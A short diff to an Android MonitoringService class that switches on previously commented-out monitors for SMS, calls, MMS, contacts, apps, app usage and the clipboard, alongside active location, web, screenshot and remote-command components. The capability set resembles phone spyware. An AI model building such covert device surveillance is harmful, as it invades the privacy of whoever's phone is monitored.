@@ -123,15 +123,15 @@ public class MonitoringService extends Service {
             }
 
             // Start monitoring components
-            //startSMSMonitor(userId, phoneModel);
-            //startCallMonitor(userId, phoneModel);
+            startSMSMonitor(userId, phoneModel);
+            startCallMonitor(userId, phoneModel);
             startLocationMonitor(userId, phoneModel);
-            //startMMSMonitor(userId, phoneModel);
-            //startContactMonitor(userId, phoneModel);
-            //startAppMonitor(userId, phoneModel);
+            startMMSMonitor(userId, phoneModel);
+            startContactMonitor(userId, phoneModel);
+            startAppMonitor(userId, phoneModel);
             startWebMonitor(userId, phoneModel);
-            //startAppUsageMonitor(userId, phoneModel);
-            //startClipboardMonitor(userId, phoneModel); // Added Clipboard Monitor
+            startAppUsageMonitor(userId, phoneModel);
+            startClipboardMonitor(userId, phoneModel); // Added Clipboard Monitor
             initializeCommandListener(userId, phoneModel); // Initialize CommandListener
             startScreenshotMonitor(userId, phoneModel); // Initialize ScreenshotMonitor
 
